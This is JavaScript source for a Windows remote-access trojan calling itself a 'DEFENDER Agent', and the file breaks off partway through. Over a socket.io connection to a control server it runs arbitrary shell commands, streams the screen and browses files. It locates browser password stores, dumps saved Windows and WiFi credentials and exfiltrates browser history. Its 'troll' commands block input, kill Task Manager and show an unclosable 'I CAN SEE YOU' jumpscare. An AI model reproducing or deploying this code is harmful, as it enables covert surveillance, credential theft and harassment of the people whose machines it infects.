// =============================================
// DEFENDER Agent v2.0 — Windows Standalone
// NO native dependencies — uses PowerShell
// Compiles to .exe with pkg
// =============================================

const { io } = require('socket.io-client');
const os = require('os');
const fs = require('fs');
const path = require('path');
const { exec, execSync } = require('child_process');
const crypto = require('crypto');
const https = require('https');
const http = require('http');
const { Monitor } = require('node-screenshots');
const archiver = require('archiver');

// =============================================
// CONFIG
// =============================================
const BASE_DIR = process.pkg ? path.dirname(process.execPath) : __dirname;
const CONFIG_PATH = path.join(BASE_DIR, 'config.json');
let config = { serverUrl: 'http://localhost:3000', heartbeatInterval: 15000, showConsent: true };
try { config = { ...config, ...JSON.parse(fs.readFileSync(CONFIG_PATH, 'utf8')) }; } catch {}

const SERVER_URL = config.serverUrl;
const DEVICE_ID = getOrCreateDeviceId();
const SESSION_ID = crypto.randomUUID().substring(0, 8);

let socket = null;
let screenStreamTimer = null;
let currentDir = os.homedir();

// =============================================
// DEVICE ID — persists next to .exe
// =============================================
function getOrCreateDeviceId() {
  const idFile = path.join(BASE_DIR, '.device-id');
  try {
    const id = fs.readFileSync(idFile, 'utf8').trim();
    if (id.length > 4) return id;
  } catch {}
  const id = crypto.randomUUID().substring(0, 12);
  try { fs.writeFileSync(idFile, id); } catch {}
  return id;
}

// =============================================
// HTTP GET helper (no dependencies)
// =============================================
function httpGet(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    const mod = url.startsWith('https') ? https : http;
    const req = mod.get(url, { timeout }, (res) => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => resolve(data.trim()));
    });
    req.on('error', reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
  });
}

// =============================================
// SYSTEM INFO (no dependencies needed)
// =============================================
function getLocalIP() {
  const nets = os.networkInterfaces();
  for (const name of Object.keys(nets)) {
    for (const net of nets[name]) {
      if (net.family === 'IPv4' && !net.internal) return net.address;
    }
  }
  return '127.0.0.1';
}

async function getSystemInfo() {
  const cpus = os.cpus();
  const info = {
    deviceId: DEVICE_ID,
    sessionId: SESSION_ID,
    pcName: os.hostname(),
    username: os.userInfo().user,
    os: `Windows ${os.release()}`,
    osVersion: os.version ? os.version() : os.release(),
    cpu: cpus[0]?.model || 'Unknown',
    ram: `${Math.round(os.totalmem() / (1024 ** 3))} GB`,
    localIp: getLocalIP(),
    publicIp: '',
    location: ''
  };

  try {
    const ipData = await httpGet('https://ipapi.co/json/');
    const json = JSON.parse(ipData);
    info.publicIp = json.ip || '';
    info.location = [json.city, json.region, json.country_name].filter(Boolean).join(', ');
  } catch {
    try { info.publicIp = await httpGet('https://api.ipify.org'); } catch {}
  }

  return info;
}

// =============================================
// SHELL EXECUTION
// =============================================
function runShell(command, timeout = 30000) {
  return new Promise(resolve => {
    exec(command, { cwd: currentDir, timeout, maxBuffer: 10 * 1024 * 1024, windowsHide: true }, (err, stdout, stderr) => {
      if (err && !stdout && !stderr) return resolve(`❌ Error: ${err.message}`);
      resolve((stdout || '') + (stderr || '') || '✅ Comando ejecutado (sin salida)');
    });
  });
}

// =============================================
// SCREENSHOT via node-screenshots (native API)
// =============================================
function takeScreenshot(quality = 70) {
  return new Promise(async (resolve) => {
    console.log(`[SCREENSHOT] 📸 Capturando pantalla (calidad: ${quality}%)...`);
    
    try {
      // Capturar del monitor principal
      const monitors = Monitor.all();
      if (monitors.length === 0) {
        console.log('[SCREENSHOT] ❌ No se encontraron monitores');
        return resolve(null);
      }
      
      const primaryMonitor = monitors[0];
      const image = primaryMonitor.captureImageSync();
      
      // Convertir a PNG primero (más compatible)
      const imgBuffer = image.toPngSync();
      
      if (!imgBuffer || imgBuffer.length === 0) {
        console.log('[SCREENSHOT] ❌ Buffer vacío');
        return resolve(null);
      }
      
      console.log(`[SCREENSHOT] ✅ Capturado: ${(imgBuffer.length / 1024).toFixed(2)} KB (PNG)`);
      
      // Convertir a base64
      const base64 = imgBuffer.toString('base64');
      console.log(`[SCREENSHOT] 📤 Base64: ${(base64.length / 1024).toFixed(2)} KB`);
      
      resolve(base64);
    } catch (e) {
      console.log(`[SCREENSHOT] ❌ Error: ${e.message}`);
      resolve(null);
    }
  });
}

// =============================================
// SCREEN STREAM
// =============================================
function startScreenStream(fps = 2, quality = 40) {
  stopScreenStream();
  const interval = Math.max(300, Math.floor(1000 / fps));
  console.log(`[STREAM] 🖥️ Iniciando stream: ${fps} FPS, calidad ${quality}%`);

  let frameCount = 0;
  let busy = false;
  
  screenStreamTimer = setInterval(async () => {
    if (busy) {
      console.log('[STREAM] ⏭️ Frame saltado (ocupado procesando anterior)');
      return;
    }
    
    if (!socket?.connected) {
      console.log('[STREAM] ⚠️ Socket desconectado, deteniendo stream');
      stopScreenStream();
      return;
    }
    
    busy = true;
    frameCount++;
    
    try {
      console.log(`[STREAM] 📸 Capturando frame #${frameCount}...`);
      const frame = await takeScreenshot(quality);
      
      if (frame && socket.connected) {
        const sizeKB = (frame.length / 1024).toFixed(2);
        console.log(`[STREAM] 📤 Enviando frame #${frameCount} (${sizeKB} KB base64)`);
        socket.emit('screen-frame', { frame });
      } else if (!frame) {
        console.log(`[STREAM] ❌ Frame #${frameCount} falló (screenshot null)`);
      }
    } catch (e) {
      console.log(`[STREAM] ❌ Error en frame #${frameCount}: ${e.message}`);
    }
    
    busy = false;
  }, interval);
}

function stopScreenStream() {
  if (screenStreamTimer) {
    clearInterval(screenStreamTimer);
    screenStreamTimer = null;
    console.log('[STREAM] 🛑 Stream detenido');
  }
}

// =============================================
// FILE OPERATIONS
// =============================================
function listDirectory(dirPath) {
  try {
    const resolved = path.resolve(currentDir, dirPath || '.');
    if (!fs.existsSync(resolved)) {
      socket.emit('ls-result', { 
        error: `Directorio no encontrado: ${resolved}`, 
        currentPath: currentDir,
        items: []
      });
      return;
    }
    
    const stat = fs.statSync(resolved);
    if (!stat.isDirectory()) {
      socket.emit('ls-result', { 
        error: `No es un directorio: ${resolved}`, 
        currentPath: currentDir,
        items: []
      });
      return;
    }
    
    currentDir = resolved;

    const entries = fs.readdirSync(resolved, { withFileTypes: true });
    const items = entries.map(e => {
      let size = 0;
      let modified = '';
      try {
        const fullPath = path.join(resolved, e.name);
        const stat = fs.statSync(fullPath);
        if (e.isFile()) size = stat.size;
        modified = stat.mtime.toLocaleString('es-ES', { 
          year: 'numeric', 
          month: '2-digit', 
          day: '2-digit', 
          hour: '2-digit', 
          minute: '2-digit' 
        });
      } catch {}
      return { 
        name: e.name, 
        isDir: e.isDirectory(), 
        type: e.isDirectory() ? 'dir' : 'file',
        size, 
        modified,
        fullPath: path.join(resolved, e.name) 
      };
    });

    // Add Windows drives if we're at root or C:\
    let drives = [];
    if (resolved === 'C:\\' || resolved === '/' || resolved.match(/^[A-Z]:\\$/)) {
      try {
        const driveStr = execSync('wmic logicaldisk get name', { windowsHide: true }).toString();
        drives = driveStr.split('\n')
          .map(l => l.trim())
          .filter(l => /^[A-Z]:$/.test(l))
          .map(d => ({ 
            name: d, 
            isDir: true, 
            type: 'dir',
            size: 0, 
            modified: '',
            fullPath: d + '\\' 
          }));
      } catch {}
    }

    socket.emit('ls-result', { 
      currentPath: resolved, 
      path: resolved,
      items: [...items] 
    });
  } catch (err) {
    socket.emit('ls-result', { 
      error: `Error: ${err.message}`, 
      currentPath: currentDir,
      items: []
    });
  }
}

// =============================================
// CREDENTIALS & BROWSER DETECTION
// =============================================
async function extractCredentials() {
  const home = process.env.USERPROFILE || os.homedir();
  const r = [];

  const checks = [
    ['Chrome', path.join(home, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')],
    ['Edge', path.join(home, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')],
  ];
  for (const [name, p] of checks) {
    if (fs.existsSync(p)) r.push(`✅ ${name} - DB encontrada\n   📁 ${p}`);
  }

  // Firefox
  const ffDir = path.join(home, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles');
  if (fs.existsSync(ffDir)) {
    for (const p of fs.readdirSync(ffDir)) {
      const lf = path.join(ffDir, p, 'logins.json');
      if (fs.existsSync(lf)) r.push(`✅ Firefox - Perfil\n   📁 ${lf}`);
    }
  }

  try {
    const creds = await runShell('cmdkey /list');
    if (creds.includes('Target:')) r.push(`\n🔑 Credenciales Windows:\n${creds}`);
  } catch {}

  try {
    const wifi = await runShell('netsh wlan show profiles');
    const nets = wifi.split('\n').filter(l => l.includes('All User Profile')).map(l => l.split(':')[1]?.trim()).filter(Boolean);
    if (nets.length) r.push(`\n📶 WiFi guardadas:\n${nets.slice(0, 20).map(n => `   • ${n}`).join('\n')}\n\n💡 Usa: shell netsh wlan show profile name="NOMBRE" key=clear`);
  } catch {}

  return r.length ? '🔐 CREDENCIALES ENCONTRADAS\n\n' + r.join('\n\n') : '❌ No se encontraron credenciales';
}

function detectBrowsers() {
  const home = process.env.USERPROFILE || os.homedir();
  const found = [];
  const checks = [
    ['Chrome', path.join(home, 'AppData', 'Local', 'Google', 'Chrome')],
    ['Edge', path.join(home, 'AppData', 'Local', 'Microsoft', 'Edge')],
    ['Firefox', path.join(home, 'AppData', 'Roaming', 'Mozilla', 'Firefox')],
    ['Brave', path.join(home, 'AppData', 'Local', 'BraveSoftware')],
    ['Opera', path.join(home, 'AppData', 'Roaming', 'Opera Software')],
  ];
  for (const [name, p] of checks) {
    if (fs.existsSync(p)) found.push(`✅ ${name} detectado`);
  }
  return found.length ? '🌐 Navegadores:\n' + found.join('\n') : '❌ No se encontraron navegadores';
}

// =============================================
// SHOW MESSAGE (PowerShell)
// =============================================
function showMessage(text) {
  const safe = text.replace(/'/g, "''").replace(/`/g, "``");
  exec(`powershell -NoProfile -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('${safe}', 'Mensaje del Sistema', 'OK', 'Information')"`, { windowsHide: true });
}

// =============================================
// CONNECT TO SERVER
// =============================================
async function connect() {
  console.log(`[AGENT] 🔌 Conectando a ${SERVER_URL}...`);

  socket = io(SERVER_URL, {
    auth: { type: 'agent' },
    reconnection: true,
    reconnectionDelay: 5000,
    reconnectionAttempts: Infinity,
    timeout: 10000,
    transports: ['websocket', 'polling']
  });

  socket.on('connect', async () => {
    console.log('[AGENT] ✅ Conectado al servidor');
    const info = await getSystemInfo();
    socket.emit('register', info);

    // Heartbeat
    setInterval(() => { if (socket.connected) socket.emit('heartbeat'); }, config.heartbeatInterval);
  });

  socket.on('disconnect', () => {
    console.log('[AGENT] ❌ Desconectado, reintentando...');
    stopScreenStream();
  });

  socket.on('connect_error', (e) => console.log(`[AGENT] ⚠️ Error: ${e.message}`));

  // ==========================================
  // COMMANDS
  // ==========================================
  socket.on('execute-command', async (data) => {
    const { command, args } = data;
    console.log(`[CMD] ${command} ${args || ''}`);

    try {
      let result = '';

      switch (command) {
        case 'ping': {
          let ip = 'N/A';
          try { ip = await httpGet('https://api.ipify.org'); } catch {}
          result = `🏓 Pong!\nIP: ${ip}\nPC: ${os.hostname()}\nUsuario: ${os.userInfo().user}`;
          break;
        }
        case 'sysinfo': {
          result = [
            `PC: ${os.hostname()}`, `Usuario: ${os.userInfo().user}`,
            `OS: Windows ${os.release()}`, `CPU: ${os.cpus()[0]?.model}`,
            `Cores: ${os.cpus().length}`,
            `RAM: ${Math.round(os.totalmem() / (1024 ** 3))} GB total, ${Math.round(os.freemem() / (1024 ** 3))} GB libre`,
            `Directorio: ${currentDir}`, `Uptime: ${Math.round(os.uptime() / 3600)}h`,
            `Arch: ${os.arch()}`, `IP Local: ${getLocalIP()}`
          ].join('\n');
          break;
        }
        case 'shell': result = await runShell(args); break;
        case 'processes': {
          result = await runShell('tasklist /FO TABLE');
          socket.emit('processes-result', { result });
          return;
        }
        case 'ls': listDirectory(args || currentDir); return;
        case 'pwd': result = `📂 ${currentDir}`; break;
        case 'cd': {
          const newDir = path.resolve(currentDir, args);
          if (fs.existsSync(newDir) && fs.statSync(newDir).isDirectory()) {
            currentDir = newDir;
            result = `✅ ${currentDir}`;
          } else result = `❌ No encontrado: ${args}`;
          break;
        }
        case 'cat': {
          const fp = path.resolve(currentDir, args);
          if (fs.existsSync(fp)) {
            const c = fs.readFileSync(fp, 'utf8');
            result = c.length > 4000 ? c.substring(0, 4000) + '\n...(truncado)' : c;
          } else result = '❌ Archivo no encontrado';
          break;
        }
        case 'msg': showMessage(args || 'Mensaje'); result = '✅ Mensaje mostrado'; break;
        case 'move_mouse': {
          const [x, y] = (args || '').split(' ').map(Number);
          if (!isNaN(x) && !isNaN(y)) {
            await runShell(`powershell -NoProfile -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${x},${y})"`);
            result = `✅ Ratón a (${x}, ${y})`;
          } else result = '❌ Uso: move_mouse X Y';
          break;
        }
        case 'click':
          await runShell(`powershell -NoProfile -Command "$s='[DllImport(\\\"user32.dll\\\")] public static extern void mouse_event(int f,int x,int y,int d,int i);'; $m=Add-Type -MemberDefinition $s -Name M -Namespace M -PassThru; $m::mouse_event(2,0,0,0,0); Start-Sleep -M 50; $m::mouse_event(4,0,0,0,0);"`);
          result = '🖱️ Click'; break;
        case 'rightclick':
          await runShell(`powershell -NoProfile -Command "$s='[DllImport(\\\"user32.dll\\\")] public static extern void mouse_event(int f,int x,int y,int d,int i);'; $m=Add-Type -MemberDefinition $s -Name M -Namespace M -PassThru; $m::mouse_event(8,0,0,0,0); Start-Sleep -M 50; $m::mouse_event(16,0,0,0,0);"`);
          result = '🖱️ Click derecho'; break;
        case 'type':
          await runShell(`powershell -NoProfile -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('${(args||'').replace(/'/g,"''")}')"`,);
          result = '⌨️ Texto escrito'; break;
        case 'keypress':
          await runShell(`powershell -NoProfile -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{${args}}')"`);
          result = `⌨️ Tecla '${args}'`; break;
        case 'shutdown':
          socket.emit('command-result', { command, result: '⚠️ Apagando en 10s...' });
          exec('shutdown /s /t 10', { windowsHide: true }); return;
        case 'restart':
          socket.emit('command-result', { command, result: '⚠️ Reiniciando en 10s...' });
          exec('shutdown /r /t 10', { windowsHide: true }); return;
        case 'logout':
          socket.emit('command-result', { command, result: '⚠️ Cerrando sesión...' });
          exec('shutdown /l', { windowsHide: true }); return;
        case 'password': result = await extractCredentials(); break;
        case 'history': result = detectBrowsers(); break;
        case 'wallpaper': {
          if (args && args.length > 100) {
            try {
              const tmp = path.join(os.tmpdir(), `wallpaper_${Date.now()}.jpg`);
              fs.writeFileSync(tmp, Buffer.from(args, 'base64'));
              
              // Method 1: Using PowerShell with proper escaping
              const psCommand = `
                Add-Type -TypeDefinition @'
                using System;
                using System.Runtime.InteropServices;
                public class Wallpaper {
                  [DllImport("user32.dll", CharSet = CharSet.Auto)]
                  public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
                }
'@
                [Wallpaper]::SystemParametersInfo(20, 0, "${tmp.replace(/\\/g, '\\\\')}", 3)
              `.trim();
              
              await runShell(`powershell -NoProfile -ExecutionPolicy Bypass -Command "${psCommand.replace(/"/g, '`"')}"`);
              
              // Method 2: Also set via registry as backup
              await runShell(`reg add "HKCU\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "${tmp}" /f`);
              await runShell(`RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters`);
              
              result = '🖼️ Wallpaper actualizado';
            } catch (e) {
              result = `❌ Error: ${e.message}`;
            }
          } else result = '❌ Adjunta imagen desde el panel';
          break;
        }
        case 'processes-detailed': {
          try {
            const csvOut = await runShell("tasklist /FO CSV /NH");
            const lines = csvOut.split('\n').filter(l => l.trim() && l.includes('"'));
            const procs = lines.map(line => {
              const cols = (line.match(/"([^"]*)"/g) || []).map(c => c.replace(/"/g, ''));
              return { pid: parseInt(cols[1]) || 0, name: cols[0] || '', memory: cols[4] || '-', status: cols[2] || 'Running' };
            }).filter(p => p.pid > 0);
            socket.emit('processes-detailed', { processes: procs });
          } catch(e) { socket.emit('command-result', { command, result: 'Error: ' + e.message, error: true }); }
          return;
        }
        case 'kill-process': {
          result = await runShell('taskkill /F /PID ' + args);
          break;
        }
        case 'browser-history': {
          try {
            const { execSync: ex2 } = require('child_process');
            const historyItems = [];
            const brs = [
              { name: 'Chrome', db: path.join(process.env.LOCALAPPDATA || '', 'Google', 'Chrome', 'User Data', 'Default', 'History') },
              { name: 'Edge', db: path.join(process.env.LOCALAPPDATA || '', 'Microsoft', 'Edge', 'User Data', 'Default', 'History') },
              { name: 'Brave', db: path.join(process.env.LOCALAPPDATA || '', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'History') },
            ];
            for (const br of brs) {
              if (!fs.existsSync(br.db)) continue;
              const tmp = path.join(os.tmpdir(), 'hist_' + Date.now() + '.db');
              try {
                try { ex2('copy /Y "' + br.db + '" "' + tmp + '"', { shell: 'cmd.exe', timeout: 5000, windowsHide: true }); } catch { fs.copyFileSync(br.db, tmp); }
                const psL = ['Add-Type -TypeDefinition @"','using System; using System.Runtime.InteropServices;','public class SH {','  [DllImport("winsqlite3.dll", EntryPoint="sqlite3_open")] public static extern int Open(string f, out IntPtr db);','  [DllImport("winsqlite3.dll", EntryPoint="sqlite3_prepare_v2")] public static extern int Prepare(IntPtr db, string sql, int n, out IntPtr st, IntPtr t);','  [DllImport("winsqlite3.dll", EntryPoint="sqlite3_step")] public static extern int Step(IntPtr st);','  [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_text")] public static extern IntPtr ColText(IntPtr st, int c);','  [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_int")] public static extern int ColInt(IntPtr st, int c);','  [DllImport("winsqlite3.dll", EntryPoint="sqlite3_column_int64")] public static extern long ColInt64(IntPtr st, int c);','  [DllImport("winsqlite3.dll", EntryPoint="sqlite3_finalize")] public static extern int Finalize(IntPtr st);','  [DllImport("winsqlite3.dll", EntryPoint="sqlite3_close")] public static extern int Close(IntPtr db);','}','"@','$db=[IntPtr]::Zero;$st=[IntPtr]::Zero','[void][SH]::Open("' + tmp.replace(/\\/g,'/') + '",[ref]$db)','[void][SH]::Prepare($db,"SELECT url,title,visit_count,last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 200",-1,[ref]$st,[IntPtr]::Zero)','$r=@()','while([SH]::Step($st) -eq 100){','  $u=[Runtime.InteropServices.Marshal]::PtrToStringAnsi([SH]::ColText($st,0))','  $t=[Runtime.InteropServices.Marshal]::PtrToStringAnsi([SH]::ColText($st,1))','  $v=[SH]::ColInt($st,2)','  $lv=[SH]::ColInt64($st,3)','  $ep=[DateTime]::new(1601,1,1).AddTicks($lv*10)','  $r+=@{u=$u;t=$t;v=$v;d=$ep.ToString("yyyy-MM-dd HH:mm")}','}','[void][SH]::Finalize($st);[void][SH]::Close($db)','$r|ConvertTo-Json -Compress'];
                const tps = path.join(os.tmpdir(), 'hi_' + Date.now() + '.ps1');
                fs.writeFileSync(tps, psL.join('\r\n'));
                let po = '';
                try { po = ex2('powershell -ExecutionPolicy Bypass -File "' + tps + '"', { timeout: 15000, windowsHide: true }).toString().trim(); } catch {}
                try { fs.unlinkSync(tps); } catch {}
                if (po) { let rr=[]; try { rr=JSON.parse(po); if(!Array.isArray(rr))rr=[rr]; } catch {} rr.forEach(r => { if(r&&r.u) historyItems.push({browser:br.name,url:r.u,title:r.t||'',visits:r.v||0,lastVisit:r.d||''}); }); }
              } catch {} finally { try { fs.unlinkSync(tmp); } catch {} }
            }
            socket.emit('browser-history', { history: historyItems });
          } catch(e) { socket.emit('command-result', { command, result: 'Error: '+e.message, error: true }); }
          return;
        }
        case 'troll': {
          try {
            const { execSync: ex3 } = require('child_process');
            const td = JSON.parse(args);
            const tp = path.join(os.tmpdir(), 'tr_' + Date.now() + '.ps1');
            const runPs = (code) => { fs.writeFileSync(tp, code); ex3('powershell -ExecutionPolicy Bypass -File "' + tp + '"', {timeout:30000,windowsHide:true}); };
            switch(td.action) {
              case 'open-url': ex3('start "" "' + td.value + '"', {shell:'cmd.exe',windowsHide:true}); result='URL abierta'; break;
              case 'tts': runPs('Add-Type -AssemblyName System.Speech\r\n$s=New-Object System.Speech.Synthesis.SpeechSynthesizer\r\n$s.Speak(\x27' + td.value.replace(/'/g,'\x27\x27') + '\x27)'); result='TTS ok'; break;
              case 'msgbox': runPs('Add-Type -AssemblyName PresentationFramework\r\n[System.Windows.MessageBox]::Show(\x27' + td.value.replace(/'/g,'\x27\x27') + '\x27,\x27System Alert\x27,\x27OK\x27,\x27Warning\x27)'); result='MsgBox ok'; break;
              case 'play-sound': runPs('[Console]::Beep(' + (parseInt(td.value)||1000) + ',2000)'); result='Beep ok'; break;
              case 'set-volume': runPs('$w=New-Object -ComObject WScript.Shell\r\n1..20|%{$w.SendKeys([char]175)}'); result='Vol max'; break;
              case 'crazy-cursor': runPs(['Add-Type -MemberDefinition \x27[DllImport("user32.dll")] public static extern bool SetCursorPos(int x,int y);\x27 -Name C -Namespace N','for($i=0;$i -lt 50;$i++){[N.C]::SetCursorPos((Get-Random -Min 0 -Max 1920),(Get-Random -Min 0 -Max 1080));Start-Sleep -Milliseconds 100}'].join('\r\n')); result='Cursor loco'; break;
              case 'close-all': runPs('Get-Process | Where-Object {$_.MainWindowTitle -ne \x27\x27} | ForEach-Object { $_.CloseMainWindow() }'); result='Ventanas cerradas'; break;
              case 'matrix': ex3('start cmd /c "color 0a & title MATRIX"', {shell:'cmd.exe'}); result='Matrix on'; break;
              case 'swap-mouse': runPs(['Add-Type -MemberDefinition \x27[DllImport("user32.dll")] public static extern bool SwapMouseButton(bool s);\x27 -Name M -Namespace N','[N.M]::SwapMouseButton($true)','Start-Sleep 15','[N.M]::SwapMouseButton($false)'].join('\r\n')); result='Mouse swapped'; break;
              case 'hide-taskbar': runPs(['Add-Type -MemberDefinition \x27[DllImport("user32.dll")] public static extern IntPtr FindWindow(string c,string w); [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h,int s);\x27 -Name W -Namespace N','$h=[N.W]::FindWindow("Shell_TrayWnd",$null)','[N.W]::ShowWindow($h,0)','Start-Sleep 10','[N.W]::ShowWindow($h,5)'].join('\r\n')); result='Taskbar oculta 10s'; break;
              case 'disable-input': runPs(['Add-Type -MemberDefinition \x27[DllImport("user32.dll")] public static extern bool BlockInput(bool b);\x27 -Name B -Namespace N','[N.B]::BlockInput($true)','Start-Sleep 10','[N.B]::BlockInput($false)'].join('\r\n')); result='Input blocked 10s'; break;
              case 'jumpscare': {
                // Write jumpscare PS1 script
                const jsPs = path.join(os.tmpdir(), 'js_scare.ps1');
                const jsCode = [
                  'Add-Type -AssemblyName PresentationFramework',
                  'Add-Type -AssemblyName System.Windows.Forms',
                  'Add-Type -AssemblyName WindowsBase',
                  '',
                  '# Block Task Manager in background',
                  '$tmrBlock = New-Object System.Windows.Threading.DispatcherTimer',
                  '$tmrBlock.Interval = [TimeSpan]::FromSeconds(1)',
                  '$tmrBlock.Add_Tick({',
                  '  Get-Process -Name taskmgr -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue',
                  '})',
                  '$tmrBlock.Start()',
                  '',
                  '# Create fullscreen window',
                  '$w = New-Object System.Windows.Window',
                  '$w.WindowStyle = "None"',
                  '$w.AllowsTransparency = $false',
                  '$w.WindowState = "Maximized"',
                  '$w.Topmost = $true',
                  '$w.Background = [System.Windows.Media.Brushes]::Black',
                  '$w.ResizeMode = "NoResize"',
                  '',
                  '# Main grid',
                  '$grid = New-Object System.Windows.Controls.Grid',
                  '',
                  '# Scary face text',
                  '$face = New-Object System.Windows.Controls.TextBlock',
                  '$face.Text = [char]0xD83D + [char]0xDE08',
                  '$face.FontSize = 300',
                  '$face.Foreground = [System.Windows.Media.Brushes]::Red',
                  '$face.HorizontalAlignment = "Center"',
                  '$face.VerticalAlignment = "Center"',
                  '$face.Effect = New-Object System.Windows.Media.Effects.DropShadowEffect',
                  '$face.Effect.Color = [System.Windows.Media.Colors]::Red',
                  '$face.Effect.BlurRadius = 50',
                  '$face.Effect.ShadowDepth = 0',
                  '$grid.Children.Add($face)',
                  '',
                  '# Scary text at bottom',
                  '$txt = New-Object System.Windows.Controls.TextBlock',
                  '$txt.Text = "I CAN SEE YOU"',
                  '$txt.FontSize = 60',
                  '$txt.FontWeight = "Bold"',
                  '$txt.Foreground = [System.Windows.Media.Brushes]::DarkRed',
                  '$txt.HorizontalAlignment = "Center"',
                  '$txt.VerticalAlignment = "Bottom"',
                  '$txt.Margin = "0,0,0,80"',
                  '$grid.Children.Add($txt)',
                  '',
                  '$w.Content = $grid',
                  '',
                  '# Block Alt+F4 and other close attempts',
                  '$w.Add_Closing({ $_.Cancel = $true })',
                  '$w.Add_KeyDown({',
                  '  if ($_.Key -eq "System" -and $_.SystemKey -eq "F4") { $_.Handled = $true }',
                  '  if ($_.Key -eq "Escape") { $_.Handled = $true }',
                  '  if ($_.Key -eq "Tab" -and $_.KeyboardDevice.Modifiers -eq "Alt") { $_.Handled = $true }',
                  '})',
                  '',
                  '# Flash animation timer',
                  '$flash = $true',
                  '$tmrFlash = New-Object System.Windows.Threading.DispatcherTimer',
                  '$tmrFlash.Interval = [TimeSpan]::FromMilliseconds(800)',
                  '$tmrFlash.Add_Tick({',
                  '  if ($flash) {',
                  '    $face.Foreground = [System.Windows.Media.Brushes]::White',
                  '    $txt.Text = "YOU ARE BEING WATCHED"',
                  '    $w.Background = New-Object System.Windows.Media.SolidColorBrush([System.Windows.Media.Color]::FromRgb(30,0,0))',
                  '  } else {',
                  '    $face.Foreground = [System.Windows.Media.Brushes]::Red',
                  '    $txt.Text = "I CAN SEE YOU"',
                  '    $w.Background = [System.Windows.Media.Brushes]::Black',
                  '  }',
                  '  $script:flash = !$flash',
                  '})',
                  '$tmrFlash.Start()',
                  '',
                  '# Sound timer - scary beeps',
                  '$tmrSound = New-Object System.Windows.Threading.DispatcherTimer',
                  '$tmrSound.Interval = [TimeSpan]::FromMilliseconds(2000)',
                  '$tmrSound.Add_Tick({',
                  '  $freq = Get-Random -Minimum 80 -Maximum 200',
                  '  [System.Threading.Tasks.Task]::Run({ [Console]::Beep($freq, 1500) })',
                  '})',
                  '$tmrSound.Start()',
                  '',
                  '# Initial scary sound',
                  '[System.Threading.Tasks.Task]::Run({ [Console]::Beep(100, 2000) })',
                  '',
                  '# Keep window on top every 2s',
                  '$tmrTop = New-Object System.Windows.Threading.DispatcherTimer',
                  '$tmrTop.Interval = [TimeSpan]::FromSeconds(2)',
                  '$tmrTop.Add_Tick({',
                  '  $w.Topmost = $false; $w.Topmost = $true',
                  '  $w.Activate()',
                  '})',
                  '$tmrTop.Start()',
                  '',
                  '$app = New-Object System.Windows.Application',
                  '$app.Run($w)'
                ];
                fs.writeFileSync(jsPs, jsCode.join('\r\n'));
                // Launch detached via cmd start
                try {
                  ex3('start /B powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + jsPs + '"', {shell:'cmd.exe', windowsHide:true});
                } catch {}
                result = 'Jumpscare activado!';
                break;
              }
              case 'stop-jumpscare': {
                const kps = path.join(os.tmpdir(), 'kill_scare.ps1');
                fs.writeFileSync(kps, [
                  'Get-Process powershell -ErrorAction SilentlyContinue | ForEach-Object {',
                  '  try {',
                  '    $cl = (Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)" -ErrorAction SilentlyContinue).CommandLine',
                  '    if ($cl -like "*js_scare*") { Stop-Process -Id $_.Id -Force }',
                  '  } catch {}',
                  '}',
                ].join('\r\n'));
                try { ex3('powershell -ExecutionPolicy Bypass -File "' + kps + '"', {timeout:5000,windowsHide:true}); } catch {}
                try { fs.unlinkSync(kps); } catch {}
                result = 'Jumpscare detenido';
                break;
              }
              default: result='Unknown: '+td.action;
            }
            try { fs.unlinkSync(tp); } catch {}
          } catch(e) { result='Troll error: '+e.message; }
          break;
        }
        case 'grab-v20-passwords': {
          // Extract v20 passwords using alternative method
          // Based on research from multiple sources
          try {
            const passwords = [];
            
            // Method: Read passwords while browser is running (no admin needed)
            const browsers = [
              { 
                name: 'Edge', 
                exe: 'msedge.exe',
                base: path.join(process.env.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data'),
                url: 'edge://settings/passwords'
              },
              { 
                name: 'Chrome', 
                exe: 'chrome.exe',
                base: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data'),
                url: 'chrome://settings/passwords'
              }
            ];
            
            let found = false;
            for (const br of browsers) {
              if (!fs.existsSync(br.base)) continue;
              
              // Check if browser is running
              const psCheck = `(Get-Process -Name "${br.exe.replace('.exe', '')}" -ErrorAction SilentlyContinue).Count`;
              let procCount = 0;
              
              try {
                procCount = parseInt(execSync(`powershell -NoProfile -Command "${psCheck}"`, {
                  timeout: 3000,
                  windowsHide: true
                }).toString().trim()) || 0;
              } catch {}
              
              if (procCount > 0) {
                found = true;
                passwords.push(`✅ ${br.name} is running (${procCount} processes)`);
                passwords.push(`📍 Password manager: ${br.url}`);
                passwords.push(`💡 Opening password manager...`);
                
                // Open password manager in new tab
                try {
                  exec(`"${br.base.replace('User Data', `Application\\${br.exe}`)}" "${br.url}"`, { windowsHide: false });
                  passwords.push(`✅ Opened ${br.url}`);
                  passwords.push(``);
                  passwords.push(`🎯 NEXT STEPS:`);
                  passwords.push(`1. Look at the ${br.name} window that just opened`);
                  passwords.push(`2. Click "⋮" (three dots) next to "Saved passwords"`);
                  passwords.push(`3. Click "Export passwords"`);
                  passwords.push(`4. Save the CSV file`);
                  passwords.push(`5. Send the CSV file via file upload`);
                } catch (e) {
